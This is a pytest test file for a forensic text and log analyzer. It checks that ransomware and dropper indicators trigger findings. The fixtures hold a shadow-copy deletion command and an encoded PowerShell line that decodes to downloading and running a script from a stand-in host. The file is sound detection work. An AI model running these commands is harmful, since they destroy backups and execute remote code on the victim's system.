"""
Unit tests for the Text & Log forensic static analyzer.
"""

from pathlib import Path
import pytest

from forensight.analyzers.text_analyzer import TextAnalyzer
from forensight.core.types import EvidenceMetadata, FindingSeverity, IOCType


class TestTextAnalyzer:
    """Tests for log triage, suspicious command line hunting, and IOC cataloging."""

    def test_ransomware_shadow_deletion_command_detected(self, tmp_path: Path) -> None:
        """Verify presence of 'vssadmin delete shadows' triggers Critical finding."""
        log_path = tmp_path / "powershell.log"
        content = (
            "2026-11-10 14:00:00 - Executed: vssadmin delete shadows /all /quiet\n"
            "2026-11-10 14:00:01 - Connecting to http://198.51.100.22/key.php\n"
        )
        log_path.write_text(content, encoding="utf-8")

        meta = EvidenceMetadata(
            file_size_bytes=len(content),
            identified_type="LOG",
            mime_type="text/plain",
            declared_extension=".log",
            entropy=4.1,
        )

        analyzer = TextAnalyzer()
        output = analyzer.analyze(log_path, meta)

        rule_ids = {f.rule_id for f in output.findings}
        assert "TXT-RANSOM-001" in rule_ids

        ransom_finding = next(f for f in output.findings if f.rule_id == "TXT-RANSOM-001")
        assert ransom_finding.severity == FindingSeverity.CRITICAL

        # Verify extracted IP and URL
        ioc_types = {ioc.ioc_type for ioc in output.iocs}
        assert IOCType.IPV4 in ioc_types
        assert IOCType.URL in ioc_types

    def test_encoded_powershell_detected(self, tmp_path: Path) -> None:
        """Verify presence of 'powershell -enc' triggers High severity finding."""
        script_path = tmp_path / "dropper.bat"
        content = "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwAuAHAAcwAxACcAKQA="
        script_path.write_text(content, encoding="utf-8")

        meta = EvidenceMetadata(
            file_size_bytes=len(content),
            identified_type="TXT",
            mime_type="text/plain",
            declared_extension=".bat",
            entropy=4.8,
        )

        analyzer = TextAnalyzer()
        output = analyzer.analyze(script_path, meta)

        rule_ids = {f.rule_id for f in output.findings}
        assert "TXT-PS-001" in rule_ids

